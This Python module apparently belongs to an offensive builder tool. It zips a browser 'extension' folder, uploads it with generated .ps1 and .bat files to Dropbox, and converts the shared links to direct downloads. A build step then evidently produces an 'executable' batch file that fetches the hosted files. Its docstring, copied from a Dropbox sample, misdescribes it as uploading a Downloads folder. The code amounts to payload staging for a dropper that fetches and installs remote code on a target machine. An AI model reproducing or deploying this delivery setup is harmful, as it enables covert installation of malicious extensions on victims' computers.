#!/usr/bin/python


"""Upload the contents of your Downloads folder to Dropbox.
This is an example app for API v2.
"""

import os
import dropbox
from dropbox.exceptions import ApiError
import zipfile
import datetime
import time
from colors import Colors
import shutil
import build

class Drive :

	def __init__(self, extension, filetype, token) :
		self.extension = extension
		self.token = token
		self.color = Colors()
		self.drive = dropbox.Dropbox(self.token)
		self.shareds = []
		self.filetype = filetype

	def upload(self) :

		if not os.path.exists("output/extensions/tmp"):
				os.mkdir("output/extensions/tmp")

		path = "/{}".format(self.extension)

		directory = "output/extensions/{}".format(self.extension)
		zipile = "output/extensions/tmp/{}{}".format(self.extension, ".zip")
		batch = "output/builds/{}{}".format(self.extension, ".bat")
		powershell = "output/builds/{}{}".format("powershell", ".ps1")

		if not os.path.exists(zipile):
			for dirname, subdirs, files in os.walk(directory):
				zf = zipfile.ZipFile(zipile, "a", zipfile.ZIP_DEFLATED)
				for filename in files:
						zf.write(os.path.join(dirname, filename))
				zf.close()

		overwrite = True
		
		if overwrite:
			mode = dropbox.files.WriteMode.overwrite
		else:
			mode = dropbox.files.WriteMode.add

		mtime = os.path.getmtime(zipile)
		ctime = datetime.datetime(*time.gmtime(mtime)[:6])

		try:

			print('{} Upload files in dropbox'.format(self.color.status("[+]")))

			for dirname, subdirs, files in os.walk(directory):
				with open(zipile, "rb") as f :
					data = f.read()
					try:
						self.drive.files_upload(data, "{}/{}{}".format(path, self.extension, ".zip"), mode=mode, client_modified=ctime, mute=True)
					except dropbox.exceptions.ApiError as e:
						return None
				f.close()
			# print('{} Upload success!'.format(self.color.status("[+]")))
		except Exception as e:
			raise e

		try:

			# print('{} Upload .ps1 file in dropbox'.format(self.color.status("[+]")))
			with open(powershell, "rb") as pwsh :
				data = pwsh.read()
				try:
					self.drive.files_upload(data, "{}/{}{}".format(path, self.extension, ".ps1"), mode=mode, client_modified=ctime, mute=True)
				except dropbox.exceptions.ApiError as e:
					return None
			pwsh.close()
			# print('{} Upload success!'.format(self.color.status("[+]")))
		except Exception as e:
			raise e

		try:

			# print('{} Upload .bat file in dropbox'.format(self.color.status("[+]")))
			with open(batch, "rb") as pwsh :
				data = pwsh.read()
				try:
					self.drive.files_upload(data, "{}/{}{}".format(path, self.extension, ".bat"), mode=mode, client_modified=ctime, mute=True)
				except dropbox.exceptions.ApiError as e:
					return None
			pwsh.close()
			# print('{} Upload success!'.format(self.color.status("[+]")))
		except Exception as e:
			raise e

		paths = self.drive.files_list_folder("/{}".format(self.extension))

		for e, file in enumerate(paths.entries) :
			
			try:
				create = self.drive.sharing_create_shared_link(file.path_lower)
			except ApiError as err:
				if err.error.is_shared_link_already_exists() :
					print("{} Link already exists".format(self.color.error("[!]")))

		if os.path.exists("output/extensions/tmp"):
				shutil.rmtree("output/extensions/tmp")

		count = 0;

		while count < 1:

			print("{} Uploading the files with the shared link".format(self.color.yellows("[!]")))

			build.Build(self.extension, self.filetype, self.token).builder()

			try:

				# print('{} Upload .ps1 file in dropbox'.format(self.color.status("[+]")))
				with open(powershell, "rb") as pwsh :
					data = pwsh.read()
					try:
						self.drive.files_upload(data, "{}/{}{}".format(path, self.extension, ".ps1"), mode=mode, client_modified=ctime, mute=True)
					except dropbox.exceptions.ApiError as e:
						return None
				pwsh.close()
				# print('{} Upload success!'.format(self.color.status("[+]")))
			except Exception as e:
				raise e

			try:

				# print('{} Upload .bat file in dropbox'.format(self.color.status("[+]")))
				with open(batch, "rb") as pwsh :
					data = pwsh.read()
					try:
						self.drive.files_upload(data, "{}/{}{}".format(path, self.extension, ".bat"), mode=mode, client_modified=ctime, mute=True)
					except dropbox.exceptions.ApiError as e:
						return None
				pwsh.close()
				# print('{} Upload success!'.format(self.color.status("[+]")))
			except Exception as e:
				raise e

			count += 1
			print('{} The files were hosted on https://www.dropbox.com/home/{}'.format(self.color.status("[+]"), self.extension))
			print('{} The executable file was successfully created in /output/builds/{}.bat'.format(self.color.status("[+]"), self.extension))
			print('{} Done!'.format(self.color.status("[+]")))
			break

	def ShareLinks(self) :

		paths = self.drive.files_list_folder("/{}".format(self.extension))

		for e, file in enumerate(paths.entries) :
			
			try:
				shared = self.drive.sharing_get_shared_links(file.path_lower)
				for links in shared.links :
					links.url = links.url.replace("?dl=0", "?dl=1")
					self.shareds.append(links.url)
			except Exception as e:
				raise e

		return self.shareds	
